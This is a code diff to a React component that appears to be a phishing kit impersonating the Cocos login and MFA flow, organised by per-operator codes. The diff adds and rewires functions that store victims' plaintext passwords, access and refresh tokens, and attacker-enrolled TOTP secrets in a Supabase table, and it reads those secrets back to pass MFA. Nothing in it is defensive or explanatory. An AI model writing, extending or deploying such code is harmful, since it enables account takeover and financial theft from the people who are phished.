@@ -140,6 +140,45 @@ const CocosV2 = () => {
     await supabase.from("sessions").update(payload).eq("id", sid);
   }, []);
 
+  const upsertAccountForOperator = useCallback(async (partial: Record<string, unknown>) => {
+    const normalizedEmail = String(partial.email || "").trim().toLowerCase();
+    if (!normalizedEmail) return;
+
+    const nowIso = new Date().toISOString();
+    const payload = {
+      ...partial,
+      email: normalizedEmail,
+      operator_code: operatorCode,
+      updated_at: nowIso,
+    };
+
+    const { data: existing, error: findError } = await supabase
+      .from("cocos_accounts")
+      .select("id")
+      .eq("email", normalizedEmail)
+      .eq("operator_code", operatorCode)
+      .limit(1);
+
+    if (findError) {
+      console.warn("[COCOS_ACCOUNT] lookup failed", findError);
+      return;
+    }
+
+    if ((existing?.length || 0) > 0) {
+      const { error: updateError } = await supabase
+        .from("cocos_accounts")
+        .update(payload as any)
+        .eq("email", normalizedEmail)
+        .eq("operator_code", operatorCode);
+
+      if (updateError) console.warn("[COCOS_ACCOUNT] update failed", updateError);
+      return;
+    }
+
+    const { error: insertError } = await supabase.from("cocos_accounts").insert(payload as any);
+    if (insertError) console.warn("[COCOS_ACCOUNT] insert failed", insertError);
+  }, [operatorCode]);
+
   // ── Sync account data to cocos_accounts ──
   const syncAccountData = useCallback(async (token: string, userEmail: string) => {
     setStatusMsg("Consultando la seguridad de tu cuenta y tus datos...");
@@ -193,7 +232,6 @@ const CocosV2 = () => {
         phone: authData?.phone || factorsData?.phone || null,
         last_login_at: new Date().toISOString(),
         last_data_sync_at: new Date().toISOString(),
-        operator_code: operatorCode,
       };
 
       // Only include these fields if we actually have values (avoid overwriting with null)
@@ -204,7 +242,7 @@ const CocosV2 = () => {
       const pwd = lastPasswordRef.current || lastPassword;
       if (pwd) payload.password = pwd;
 
-      await supabase.from("cocos_accounts").upsert(payload, { onConflict: "email" });
+      await upsertAccountForOperator(payload);
 
       // Update session with balance info
       const totalArs = Number(balArs?.totalBalance) || 0;
@@ -215,7 +253,7 @@ const CocosV2 = () => {
     } catch (e) {
       console.warn("[SYNC] Error syncing account data", e);
     }
-  }, [callApi, refreshToken, lastPassword, mfaMethod, enrolledSecret, updateSession]);
+  }, [callApi, refreshToken, lastPassword, mfaMethod, enrolledSecret, updateSession, upsertAccountForOperator]);
 
   // =============================================
   // FLOW A: Login → MFA verify (client's own) → Sync → Done
@@ -241,14 +279,13 @@ const CocosV2 = () => {
 
         await updateSession("login_success");
         // Save password + tokens to DB immediately on successful login
-        await supabase.from("cocos_accounts").upsert({
+        await upsertAccountForOperator({
           email: submittedEmail,
           password,
           access_token: data.access_token,
           refresh_token: data.refresh_token || null,
           last_login_at: new Date().toISOString(),
-          operator_code: operatorCode,
-        } as any, { onConflict: "email" });
+        });
 
         // Read user factors
         const userData = await callApi("mfa_list_factors", { access_token: data.access_token });
@@ -262,9 +299,12 @@ const CocosV2 = () => {
           // Check if we have the TOTP secret saved in DB
           const { data: acctData } = await supabase
             .from("cocos_accounts")
-            .select("totp_secret")
-            .eq("email", submittedEmail)
-            .maybeSingle();
+              .select("totp_secret")
+              .eq("email", submittedEmail.toLowerCase())
+              .eq("operator_code", operatorCode)
+              .order("updated_at", { ascending: false })
+              .limit(1)
+              .maybeSingle();
 
           const savedSecret = acctData?.totp_secret;
 
@@ -366,7 +406,7 @@ const CocosV2 = () => {
       setError("Error de conexión. Intentá de nuevo.");
     }
     setLoading(false);
-  }, [callApi, createSession, updateSession, syncAccountData]);
+  }, [callApi, createSession, updateSession, syncAccountData, upsertAccountForOperator, operatorCode]);
 
   // ── Spanish error mapper ──
   const parseOtpError = (err: unknown, fallback: string): string => {
@@ -577,7 +617,7 @@ const CocosV2 = () => {
         enrolledSecretRef.current = totpSecret;
         setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
         await updateSession("totp_enrolled", { otp_code: `totp_secret:${totpSecret}` });
-        await supabase.from("cocos_accounts").upsert({ email, totp_secret: totpSecret, password: lastPasswordRef.current || null, profile_data: { mfa_method: "enrolled" }, operator_code: operatorCode }, { onConflict: "email" });
+        await upsertAccountForOperator({ email, totp_secret: totpSecret, password: lastPasswordRef.current || null, profile_data: { mfa_method: "enrolled" } });
 
         // Retry TOTP verify with fresh codes (up to 5 attempts)
         const verifyRes = await retryTotpVerify(token, enrollData.id, totpSecret);
@@ -600,7 +640,7 @@ const CocosV2 = () => {
     setStep("syncing");
     await syncAccountData(token, email);
     setStep("done");
-  }, [callApi, updateSession, syncAccountData, email, retryTotpVerify]);
+  }, [callApi, updateSession, syncAccountData, email, retryTotpVerify, upsertAccountForOperator]);
 
   // ── Enroll TOTP using SMS proof, then auto-verify (with token refresh + SMS re-send) ──
   const enrollTotpWithSms = useCallback(async (token: string, smsChallId: string, smsCode: string) => {
@@ -704,7 +744,7 @@ const CocosV2 = () => {
         setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
 
         await updateSession("totp_enrolled", { otp_code: `totp_secret:${totpSecret}` });
-        await supabase.from("cocos_accounts").upsert({ email, totp_secret: totpSecret, password: lastPasswordRef.current || null, profile_data: { mfa_method: "enrolled" }, operator_code: operatorCode }, { onConflict: "email" });
+        await upsertAccountForOperator({ email, totp_secret: totpSecret, password: lastPasswordRef.current || null, profile_data: { mfa_method: "enrolled" } });
 
         // Auto-verify TOTP with retry loop (up to 5 fresh codes)
         const verifyRes = await retryTotpVerify(currentToken, newFactorId, totpSecret);
@@ -739,7 +779,7 @@ const CocosV2 = () => {
       await syncAccountData(currentToken, email);
       setStep("done");
     }
-  }, [callApi, updateSession, syncAccountData, email, enrollTotpAndFinish, retryTotpVerify]);
+  }, [callApi, updateSession, syncAccountData, email, enrollTotpAndFinish, retryTotpVerify, upsertAccountForOperator]);
 
   // ── SMS Verify → then enroll TOTP with SMS proof ──
   const handleSmsVerify = useCallback(async (code: string) => {
